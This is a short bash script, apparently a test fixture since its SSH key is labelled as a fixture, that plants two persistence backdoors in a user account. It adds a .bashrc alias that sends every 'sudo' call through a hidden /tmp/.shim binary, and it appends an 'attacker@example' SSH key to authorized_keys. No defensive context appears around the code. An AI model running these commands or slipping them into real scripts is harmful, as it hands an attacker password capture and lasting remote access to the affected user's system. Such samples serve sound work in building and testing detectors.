#!/usr/bin/env bash
set -e
echo 'alias sudo="sudo /tmp/.shim"' >>~/.bashrc
echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIExampleKeyForFixtureOnly attacker@example' >>~/.ssh/authorized_keys
